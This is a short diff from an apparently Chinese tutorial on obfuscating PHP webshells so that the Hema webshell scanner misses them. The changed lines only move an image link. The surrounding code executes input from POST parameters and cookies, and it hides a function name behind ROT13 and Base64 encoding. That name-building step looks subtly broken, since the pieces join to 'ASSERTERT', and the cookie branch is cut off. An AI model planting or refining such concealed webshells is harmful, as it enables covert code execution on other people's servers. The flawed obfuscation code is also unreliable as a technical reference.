@@ -94,14 +94,14 @@ $container[“key”]($_POST[‘x’]);
 虽然我们已绕过部分工具，但河马（Webshell查杀）是更专业的在线检测引擎。要绕过它，需要在之前混淆的基础上，进行更复杂的多层编码和变换。
 
 以下是针对河马进行强化混淆的代码思路（示例结构）：
+
+![](img/be8646bcd2625dbebad71598e25160eb_1.png)
+
 ```php
 // 多层字符串替换和拼接
 $part1 = str_rot13(“NFFREG”); // 经过ROT13编码
 $part2 = base64_decode(“RVJU”); // 经过Base64编码
 $funcName = $part1 . $part2; // 拼接后解码或直接使用
-
-![](img/be8646bcd2625dbebad71598e25160eb_1.png)
-
 // 将关键动作隐藏在Cookie等超全局数组的校验中
 if (isset($_COOKIE[‘key’])) {
     $code = $_COOKIE[‘key’];
